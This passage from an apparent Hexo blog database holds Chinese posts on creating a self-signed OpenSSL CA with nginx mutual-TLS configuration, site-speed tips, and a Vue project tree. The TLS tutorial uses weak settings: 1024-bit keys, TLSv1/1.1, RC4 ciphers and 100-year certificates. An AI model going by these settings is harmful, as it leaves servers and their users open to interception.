/data/server/nginx/ssl/self/server.crt;\n        ssl_certificate_key  /data/server/nginx/ssl/self/server.key;\n        ssl_client_certificate /data/server/nginx/ssl/self/ca/ca.crt;\n\n        ssl_verify_client on;\n        ssl_protocols    TLSv1 TLSv1.1 TLSv1.2;\n        ssl_ciphers ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-RC4-SHA:!ECDHE-RSA-RC4-SHA:ECDH-ECDSA-RC4-SHA:ECDH-RSA-RC4-SHA:ECDHE-RSA-AES256-SHA:!RC4-SHA:HIGH:!aNULL:!eNULL:!LOW:!3DES:!MD5:!EXP:!CBC:!EDH:!kEDH:!PSK:!SRP:!kECDH;\n        ssl_prefer_server_ciphers On;\n\n        index index.html index.htm index.php;\n        root /data/www;\n        location ~ .*\\.(php|php5)?$\n        {\n                #fastcgi_pass  unix:/tmp/php-cgi.sock;\n                fastcgi_pass  127.0.0.1:9000;\n                fastcgi_index index.php;\n                include fastcgi.conf;\n        }\n        location ~ .*\\.(gif|jpg|jpeg|png|bmp|swf)$\n        {\n                expires 30d;\n        }\n        location ~ .*\\.(js|css)?$\n        {\n                expires 1h;\n        }\n###this is to use open website lianjie like on apache##\n        location / {\n                if (!-e $request_filename) {\n                        rewrite ^(.*)$ /index.php?s=$1 last;\n                        break;\n                }\n                 keepalive_timeout  0;\n        }\n        location ~ /.svn/ {\n        deny all;\n        }\n###end##\n        include /data/server/nginx/conf/rewrite/test.conf;\n        access_log /log/nginx/access/access.log; \n}\n```\n\n\n\n\n\n## 签名算法种类\n\n通过openssl dgst -help查看\n\n## 参考\n[nginx实现https双向认证](https://blog.51cto.com/tchuairen/1782945)","slug":"openssl_selfsign","published":0,"date":"2020-01-23T08:27:34.032Z","updated":"2020-01-23T08:21:31.000Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"ck5qhi0560007g0ukgbbz2mzh","content":"<h1 id=\"Openssl自签名证书及HTTPS\"><a href=\"#Openssl自签名证书及HTTPS\" class=\"headerlink\" title=\"Openssl自签名证书及HTTPS\"></a>Openssl自签名证书及HTTPS</h1><h2 id=\"步骤\"><a href=\"#步骤\" class=\"headerlink\" title=\"步骤\"></a>步骤</h2><h3 id=\"自建CA\"><a href=\"#自建CA\" class=\"headerlink\" title=\"自建CA\"></a>自建CA</h3><p>vim /etc/pki/tls/openssl.cnf确认并修改配置(这里文件地址根据具体的来，Ubuntu下这个地址就不是对的)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dir             = /etc/pki/CA # CA的工作目录</span><br><span class=\"line\">database        = $dir/index.txt # 签署证书的数据记录文件</span><br><span class=\"line\">new_certs_dir   = $dir/newcerts # 存放新签署证书的目录</span><br><span class=\"line\">serial          = $dir/serial # 新证书签署号记录文件</span><br><span class=\"line\">certificate     = $dir/ca.crt # CA的证书路径</span><br><span class=\"line\">private_key     = $dir/private/cakey.pem # CA的私钥路径</span><br></pre></td></tr></table></figure>\n\n<p><code>su root</code></p>\n<p><code>cd /etc/pki/CA</code> # 切换到CA的工作目录</p>\n<p><code>(umask 077; openssl genrsa -out private/cakey.pem 2048)</code>   # 制作CA私钥</p>\n<p><code>openssl req -new -x509 -key private/cakey.pem  -out ca.crt</code> # 制作自签名证书</p>\n<p><code>touch index.txt &amp;&amp; touch serial &amp;&amp; echo &#39;01&#39;&gt; serial</code>  # 生成数据记录文件，生成签署号记录文件，给文件一个初始号。</p>\n<h2 id=\"签名服务端证书\"><a href=\"#签名服务端证书\" class=\"headerlink\" title=\"签名服务端证书\"></a>签名服务端证书</h2><p><code>(umask 077; openssl genrsa -out server.key 1024)</code> # 制作服务器端私钥</p>\n<p><code>openssl req -new -key server.key -sha512 -out server.csr</code>  # 制作服务器端证书申请指定使用sha512算法签名 （默认使用sha1算法）</p>\n<p> <code>openssl ca -in server.csr -out server.crt -days 36500</code>  # 签署证书</p>\n<h2 id=\"签名客户端证书\"><a href=\"#签名客户端证书\" class=\"headerlink\" title=\"签名客户端证书\"></a>签名客户端证书</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 制作客户端私钥</span><br><span class=\"line\">(umask 077; openssl genrsa -out kehuduan.key 1024)</span><br><span class=\"line\"></span><br><span class=\"line\"># 制作客户端证书申请</span><br><span class=\"line\">openssl req -new -key kehuduan.key -out kehuduan.csr </span><br><span class=\"line\"></span><br><span class=\"line\"># 签署证书</span><br><span class=\"line\">openssl ca -in kehuduan.csr -out kehuduan.crt -days 3650</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"注意事项\"><a href=\"#注意事项\" class=\"headerlink\" title=\"注意事项\"></a>注意事项</h2><p>1、制作证书时会提示输入密码，设置密码可选，服务器证书和客户端证书密码可以不相同。</p>\n<p>2、服务器证书和客户端证书制作时提示输入省份、城市、域名信息等，需保持一致。</p>\n<p>3、以下信息根证书需要和客户端证书匹配，否则可能出现签署问题。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">countryName = match</span><br><span class=\"line\">stateOrProvinceName = match</span><br><span class=\"line\">organizationName = match</span><br><span class=\"line\">organizationalUnitName = match</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Nginx\"><a href=\"#Nginx\" class=\"headerlink\" title=\"Nginx\"></a>Nginx</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">server &#123;</span><br><span class=\"line\">        listen       443;</span><br><span class=\"line\">        server_name  pro.server.com;</span><br><span class=\"line\">        ssi on;</span><br><span class=\"line\">        ssi_silent_errors on;</span><br><span class=\"line\">        ssi_types text/shtml;</span><br><span class=\"line\"></span><br><span class=\"line\">        ssl                  on;</span><br><span class=\"line\">        ssl_certificate      /data/server/nginx/ssl/self/server.crt;</span><br><span class=\"line\">        ssl_certificate_key  /data/server/nginx/ssl/self/server.key;</span><br><span class=\"line\">        ssl_client_certificate /data/server/nginx/ssl/self/ca/ca.crt;</span><br><span class=\"line\"></span><br><span class=\"line\">        ssl_verify_client on;</span><br><span class=\"line\">        ssl_protocols    TLSv1 TLSv1.1 TLSv1.2;</span><br><span class=\"line\">        ssl_ciphers ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-RC4-SHA:!ECDHE-RSA-RC4-SHA:ECDH-ECDSA-RC4-SHA:ECDH-RSA-RC4-SHA:ECDHE-RSA-AES256-SHA:!RC4-SHA:HIGH:!aNULL:!eNULL:!LOW:!3DES:!MD5:!EXP:!CBC:!EDH:!kEDH:!PSK:!SRP:!kECDH;</span><br><span class=\"line\">        ssl_prefer_server_ciphers On;</span><br><span class=\"line\"></span><br><span class=\"line\">        index index.html index.htm index.php;</span><br><span class=\"line\">        root /data/www;</span><br><span class=\"line\">        location ~ .*\\.(php|php5)?$</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">                #fastcgi_pass  unix:/tmp/php-cgi.sock;</span><br><span class=\"line\">                fastcgi_pass  127.0.0.1:9000;</span><br><span class=\"line\">                fastcgi_index index.php;</span><br><span class=\"line\">                include fastcgi.conf;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        location ~ .*\\.(gif|jpg|jpeg|png|bmp|swf)$</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">                expires 30d;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        location ~ .*\\.(js|css)?$</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">                expires 1h;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">###this is to use open website lianjie like on apache##</span><br><span class=\"line\">        location / &#123;</span><br><span class=\"line\">                if (!-e $request_filename) &#123;</span><br><span class=\"line\">                        rewrite ^(.*)$ /index.php?s=$1 last;</span><br><span class=\"line\">                        break;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                 keepalive_timeout  0;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        location ~ /.svn/ &#123;</span><br><span class=\"line\">        deny all;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">###end##</span><br><span class=\"line\">        include /data/server/nginx/conf/rewrite/test.conf;</span><br><span class=\"line\">        access_log /log/nginx/access/access.log; </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"签名算法种类\"><a href=\"#签名算法种类\" class=\"headerlink\" title=\"签名算法种类\"></a>签名算法种类</h2><p>通过openssl dgst -help查看</p>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><p><a href=\"https://blog.51cto.com/tchuairen/1782945\" target=\"_blank\" rel=\"noopener\">nginx实现https双向认证</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Openssl自签名证书及HTTPS\"><a href=\"#Openssl自签名证书及HTTPS\" class=\"headerlink\" title=\"Openssl自签名证书及HTTPS\"></a>Openssl自签名证书及HTTPS</h1><h2 id=\"步骤\"><a href=\"#步骤\" class=\"headerlink\" title=\"步骤\"></a>步骤</h2><h3 id=\"自建CA\"><a href=\"#自建CA\" class=\"headerlink\" title=\"自建CA\"></a>自建CA</h3><p>vim /etc/pki/tls/openssl.cnf确认并修改配置(这里文件地址根据具体的来，Ubuntu下这个地址就不是对的)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dir             = /etc/pki/CA # CA的工作目录</span><br><span class=\"line\">database        = $dir/index.txt # 签署证书的数据记录文件</span><br><span class=\"line\">new_certs_dir   = $dir/newcerts # 存放新签署证书的目录</span><br><span class=\"line\">serial          = $dir/serial # 新证书签署号记录文件</span><br><span class=\"line\">certificate     = $dir/ca.crt # CA的证书路径</span><br><span class=\"line\">private_key     = $dir/private/cakey.pem # CA的私钥路径</span><br></pre></td></tr></table></figure>\n\n<p><code>su root</code></p>\n<p><code>cd /etc/pki/CA</code> # 切换到CA的工作目录</p>\n<p><code>(umask 077; openssl genrsa -out private/cakey.pem 2048)</code>   # 制作CA私钥</p>\n<p><code>openssl req -new -x509 -key private/cakey.pem  -out ca.crt</code> # 制作自签名证书</p>\n<p><code>touch index.txt &amp;&amp; touch serial &amp;&amp; echo &#39;01&#39;&gt; serial</code>  # 生成数据记录文件，生成签署号记录文件，给文件一个初始号。</p>\n<h2 id=\"签名服务端证书\"><a href=\"#签名服务端证书\" class=\"headerlink\" title=\"签名服务端证书\"></a>签名服务端证书</h2><p><code>(umask 077; openssl genrsa -out server.key 1024)</code> # 制作服务器端私钥</p>\n<p><code>openssl req -new -key server.key -sha512 -out server.csr</code>  # 制作服务器端证书申请指定使用sha512算法签名 （默认使用sha1算法）</p>\n<p> <code>openssl ca -in server.csr -out server.crt -days 36500</code>  # 签署证书</p>\n<h2 id=\"签名客户端证书\"><a href=\"#签名客户端证书\" class=\"headerlink\" title=\"签名客户端证书\"></a>签名客户端证书</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 制作客户端私钥</span><br><span class=\"line\">(umask 077; openssl genrsa -out kehuduan.key 1024)</span><br><span class=\"line\"></span><br><span class=\"line\"># 制作客户端证书申请</span><br><span class=\"line\">openssl req -new -key kehuduan.key -out kehuduan.csr </span><br><span class=\"line\"></span><br><span class=\"line\"># 签署证书</span><br><span class=\"line\">openssl ca -in kehuduan.csr -out kehuduan.crt -days 3650</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"注意事项\"><a href=\"#注意事项\" class=\"headerlink\" title=\"注意事项\"></a>注意事项</h2><p>1、制作证书时会提示输入密码，设置密码可选，服务器证书和客户端证书密码可以不相同。</p>\n<p>2、服务器证书和客户端证书制作时提示输入省份、城市、域名信息等，需保持一致。</p>\n<p>3、以下信息根证书需要和客户端证书匹配，否则可能出现签署问题。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">countryName = match</span><br><span class=\"line\">stateOrProvinceName = match</span><br><span class=\"line\">organizationName = match</span><br><span class=\"line\">organizationalUnitName = match</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Nginx\"><a href=\"#Nginx\" class=\"headerlink\" title=\"Nginx\"></a>Nginx</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">server &#123;</span><br><span class=\"line\">        listen       443;</span><br><span class=\"line\">        server_name  pro.server.com;</span><br><span class=\"line\">        ssi on;</span><br><span class=\"line\">        ssi_silent_errors on;</span><br><span class=\"line\">        ssi_types text/shtml;</span><br><span class=\"line\"></span><br><span class=\"line\">        ssl                  on;</span><br><span class=\"line\">        ssl_certificate      /data/server/nginx/ssl/self/server.crt;</span><br><span class=\"line\">        ssl_certificate_key  /data/server/nginx/ssl/self/server.key;</span><br><span class=\"line\">        ssl_client_certificate /data/server/nginx/ssl/self/ca/ca.crt;</span><br><span class=\"line\"></span><br><span class=\"line\">        ssl_verify_client on;</span><br><span class=\"line\">        ssl_protocols    TLSv1 TLSv1.1 TLSv1.2;</span><br><span class=\"line\">        ssl_ciphers ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-RC4-SHA:!ECDHE-RSA-RC4-SHA:ECDH-ECDSA-RC4-SHA:ECDH-RSA-RC4-SHA:ECDHE-RSA-AES256-SHA:!RC4-SHA:HIGH:!aNULL:!eNULL:!LOW:!3DES:!MD5:!EXP:!CBC:!EDH:!kEDH:!PSK:!SRP:!kECDH;</span><br><span class=\"line\">        ssl_prefer_server_ciphers On;</span><br><span class=\"line\"></span><br><span class=\"line\">        index index.html index.htm index.php;</span><br><span class=\"line\">        root /data/www;</span><br><span class=\"line\">        location ~ .*\\.(php|php5)?$</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">                #fastcgi_pass  unix:/tmp/php-cgi.sock;</span><br><span class=\"line\">                fastcgi_pass  127.0.0.1:9000;</span><br><span class=\"line\">                fastcgi_index index.php;</span><br><span class=\"line\">                include fastcgi.conf;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        location ~ .*\\.(gif|jpg|jpeg|png|bmp|swf)$</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">                expires 30d;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        location ~ .*\\.(js|css)?$</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">                expires 1h;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">###this is to use open website lianjie like on apache##</span><br><span class=\"line\">        location / &#123;</span><br><span class=\"line\">                if (!-e $request_filename) &#123;</span><br><span class=\"line\">                        rewrite ^(.*)$ /index.php?s=$1 last;</span><br><span class=\"line\">                        break;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                 keepalive_timeout  0;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        location ~ /.svn/ &#123;</span><br><span class=\"line\">        deny all;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">###end##</span><br><span class=\"line\">        include /data/server/nginx/conf/rewrite/test.conf;</span><br><span class=\"line\">        access_log /log/nginx/access/access.log; </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"签名算法种类\"><a href=\"#签名算法种类\" class=\"headerlink\" title=\"签名算法种类\"></a>签名算法种类</h2><p>通过openssl dgst -help查看</p>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><p><a href=\"https://blog.51cto.com/tchuairen/1782945\" target=\"_blank\" rel=\"noopener\">nginx实现https双向认证</a></p>\n"},{"_content":"# 网站访问速度优化经验\n\n1. 网络检测确定网络拓扑空间距离延迟导致的服务器响应慢\n2. 网络检测确定网络带宽导致的服务器响应慢\n\n3. 内部路由环境导致的服务器响应慢\n4. 应用程序导致的服务器响应慢\n5. 响应数据导致的服务器响应慢\n\n## 检测方案\n\n1. `ping`检测延迟 \n2. 带宽测试 \n3. 判断gzip压缩传输是否生效，查看响应头中是否有`content-encoding: gzip`标识 \n\n## 优化方案\n\n1. 网络原因导致的响应慢，考虑进行CDN优化\n\n2. 响应数据导致的响应慢： \n\n   ```\n   1. 文件缩容，如js文件混淆压缩 \n   2. 考虑压缩传输，如gzip\n   ```\n\n   \n\n   ","source":"_drafts/optimize_site.md","raw":"# 网站访问速度优化经验\n\n1. 网络检测确定网络拓扑空间距离延迟导致的服务器响应慢\n2. 网络检测确定网络带宽导致的服务器响应慢\n\n3. 内部路由环境导致的服务器响应慢\n4. 应用程序导致的服务器响应慢\n5. 响应数据导致的服务器响应慢\n\n## 检测方案\n\n1. `ping`检测延迟 \n2. 带宽测试 \n3. 判断gzip压缩传输是否生效，查看响应头中是否有`content-encoding: gzip`标识 \n\n## 优化方案\n\n1. 网络原因导致的响应慢，考虑进行CDN优化\n\n2. 响应数据导致的响应慢： \n\n   ```\n   1. 文件缩容，如js文件混淆压缩 \n   2. 考虑压缩传输，如gzip\n   ```\n\n   \n\n   ","slug":"optimize_site","published":0,"date":"2020-01-23T08:27:34.173Z","updated":"2020-01-23T08:21:31.000Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"ck5qhi0570008g0ukankbtxoq","content":"<h1 id=\"网站访问速度优化经验\"><a href=\"#网站访问速度优化经验\" class=\"headerlink\" title=\"网站访问速度优化经验\"></a>网站访问速度优化经验</h1><ol>\n<li><p>网络检测确定网络拓扑空间距离延迟导致的服务器响应慢</p>\n</li>\n<li><p>网络检测确定网络带宽导致的服务器响应慢</p>\n</li>\n<li><p>内部路由环境导致的服务器响应慢</p>\n</li>\n<li><p>应用程序导致的服务器响应慢</p>\n</li>\n<li><p>响应数据导致的服务器响应慢</p>\n</li>\n</ol>\n<h2 id=\"检测方案\"><a href=\"#检测方案\" class=\"headerlink\" title=\"检测方案\"></a>检测方案</h2><ol>\n<li><code>ping</code>检测延迟 </li>\n<li>带宽测试 </li>\n<li>判断gzip压缩传输是否生效，查看响应头中是否有<code>content-encoding: gzip</code>标识 </li>\n</ol>\n<h2 id=\"优化方案\"><a href=\"#优化方案\" class=\"headerlink\" title=\"优化方案\"></a>优化方案</h2><ol>\n<li><p>网络原因导致的响应慢，考虑进行CDN优化</p>\n</li>\n<li><p>响应数据导致的响应慢： </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. 文件缩容，如js文件混淆压缩 </span><br><span class=\"line\">2. 考虑压缩传输，如gzip</span><br></pre></td></tr></table></figure>\n\n\n\n</li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"网站访问速度优化经验\"><a href=\"#网站访问速度优化经验\" class=\"headerlink\" title=\"网站访问速度优化经验\"></a>网站访问速度优化经验</h1><ol>\n<li><p>网络检测确定网络拓扑空间距离延迟导致的服务器响应慢</p>\n</li>\n<li><p>网络检测确定网络带宽导致的服务器响应慢</p>\n</li>\n<li><p>内部路由环境导致的服务器响应慢</p>\n</li>\n<li><p>应用程序导致的服务器响应慢</p>\n</li>\n<li><p>响应数据导致的服务器响应慢</p>\n</li>\n</ol>\n<h2 id=\"检测方案\"><a href=\"#检测方案\" class=\"headerlink\" title=\"检测方案\"></a>检测方案</h2><ol>\n<li><code>ping</code>检测延迟 </li>\n<li>带宽测试 </li>\n<li>判断gzip压缩传输是否生效，查看响应头中是否有<code>content-encoding: gzip</code>标识 </li>\n</ol>\n<h2 id=\"优化方案\"><a href=\"#优化方案\" class=\"headerlink\" title=\"优化方案\"></a>优化方案</h2><ol>\n<li><p>网络原因导致的响应慢，考虑进行CDN优化</p>\n</li>\n<li><p>响应数据导致的响应慢： </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. 文件缩容，如js文件混淆压缩 </span><br><span class=\"line\">2. 考虑压缩传输，如gzip</span><br></pre></td></tr></table></figure>\n\n\n\n</li>\n</ol>\n"},{"_content":"├── README.md\n├── build\n│   ├── build.js\n│   ├── check-versions.js\n│   ├── dev-client.js\n│   ├── dev-server.js\n│   ├── utils.js\n│   ├── webpack.base.conf.js\n│   ├── webpack.dev.conf.js\n│   └── webpack.prod.conf.js\n├── config\n│   ├── dev.env.js\n│   ├── index.js\n│   └── prod.env.js\n├── docs\n│   ├── index.html\n│   └── static\n│       ├── css\n│       └── js\n├── git.sh\n├── index.html\n├── npm-debug.log\n├── open\n├── package.json\n├── src\n│   ├── App.vue\n│   ├── assets\n│   │   ├── list.scss\n│   │   ├── logo.png\n│   │   ├── search-btn.png\n│   │   └── style.scss\n│   ├── components\n│   │   ├── Hello.vue\n│   │   ├── Spinner.vue\n│   │   └── header.vue\n│   ├── main.js\n│   ├── router.js\n│   ├── store\n│   │   ├── api.js\n│   │   ├── modules\n│   │   ├── store.js\n│   │   └── types.js\n│   └── views\n│       ├── book\n│       ├── index.vue\n│       ├── movie\n│       └── vuex-demo.vue\n├── static\n└── tree.md\n","source":"_drafts/tree-struct-chars.md","raw":"├── README.md\n├── build\n│   ├── build.js\n│   ├── check-versions.js\n│   ├── dev-client.js\n│   ├── dev-server.js\n│   ├── utils.js\n│   ├── webpack.base.conf.js\n│   ├── webpack.dev.conf.js\n│   └── webpack.prod.conf.js\n├── config\n│   ├── dev.env.js\n│   ├── index.js\n│   └── prod.env.js\n├── docs\n│   ├── index.html\n│   └── static\n│       ├── css\n│       └── js\n├── git.sh\n├── index.html\n├── npm-debug.log\n├── open\n├── package.json\n├── src\n│   ├── App.vue\n│   ├── assets\n│   │   ├── list.scss\n│   │   ├── logo.png\n│   │   ├── search-btn.png\n│   │   └── style.scss\n│   ├── components\n│   │   ├── Hello.vue\n│   │   ├── Spinner.vue\n│   │   └── header.vue\n│   ├── main.js\n│   ├── router.js\n│   ├── store\n│   │   ├── api.js\n│   │   ├── modules\n│   │   ├── store.js\n│   │   └── types.js\n│   └── views\n│       ├── book\n│       ├── index.vue\n│       ├── movie\n│       └── vuex-demo.vue\n├── static\n└── tree.md\n","slug":"tree-struct-chars","published":0,"date":"2020-01-23T08:27:34.142Z","updated":"2020-01-23T08:21:31.000Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"ck5qhi0590009g0ukw1nhqbvo","content":"<p>├── README.md<br>├── build<br>│   ├── build.js<br>│   ├── check-versions.js<br>│   ├── dev-client.js<br>│   ├── dev-server.js<br>│   ├── utils.js<br>│   ├── webpack.base.conf.js<br>│   ├── webpack.dev.conf.js<br>│   └── webpack.prod.conf.js<br>├── config<br>│   ├── dev.env.js<br>│   ├── index.js<br>│   └── prod.env.js<br>├── docs<br>│   ├── index.html<br>│   └── static<br>│       ├── css<br>│       └── js<br>├── git.sh<br>├── index.html<br>├── npm-debug.log<br>├── open<br>├── package.json<br>├── src<br>│   ├── App.vue<br>│   ├── assets<br>│   │   ├── list.scss<br>│   │   ├── logo.png<br>│   │   ├── search-btn.png<br>│   │   └── style.scss<br>│   ├── components<br>│   │   ├── Hello.vue<br>│   │   ├── Spinner.vue<br>│   │   └── header.vue<br>│   ├── main.js<br>│   ├── router.js<br>│   ├── store<br>│   │   ├── api.js<br>│   │   ├── modules<br>│   │   ├── store.js<br>│   │   └── types.js<br>│   └── views<br>│       ├── book<br>│       ├── index.vue<br>│       ├── movie<br>│       └── vuex-demo.vue<br>├── static<br>└── tree.md</p>\n","site":{"data":{}},"excerpt":"","more":"<p>├── README.md<br>├── build<br>│   ├── build.js<br>│   ├── check-versions.js<br>│   ├── dev-client.js<br>│   ├── dev-server.js<br>│   ├── utils.js<br>│   ├── webpack.base.conf.js<br>│   ├── webpack.dev.conf.js<br>│   └── webpack.prod.conf.js<br>├── config<br>│   ├── dev.env.js<br>│   ├── index.js<br>│   └── prod.env.js<br>├── docs<br>│   ├── index.html<br>│   └── static<br>│       ├── css<br>│       └── js<br>├── git.sh<br>├── index.html<br>├── npm-debug.log<br>├── open<br>├── package.json<br>├── src<br>│   ├── App.vue<br>│   ├── assets<br>│   │   ├── list.scss<br>│   │   ├── logo.png<br>│   │   ├── search-btn.png<br>│   │   └── style.scss<br>│   ├── components<br>│   │   ├── Hello.vue<br>│   │   ├── Spinner.vue<br>│   │   └── header.vue<br>│   ├── main.js<br>│   ├── router.js<br>│   ├── store<br>│   │   ├── api.js<br>│   │   ├── modules<br>│   │   ├── store.js<br>│   │   └── types.js<br>│   └── views<br>│       ├── book<br>│       ├── index.vue<br>│       ├── movie<br>│       └── vuex-demo.vue<br>├── static<br>└── tree.md</p>\n"},{"title":"关于spring redis 缓存配置错误的问题","date":"2017-05-20T00:25:11.000Z","keywords":"redis, UnsatisfiedDependencyException","rId":"MB-17052001","_content":"\n按照网上提供的配置spring redis缓存配置问题，启动后出现如下错误\n\n```\norg.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'cacheManager' defined in class path resource [spring/spring-redis.xml]: 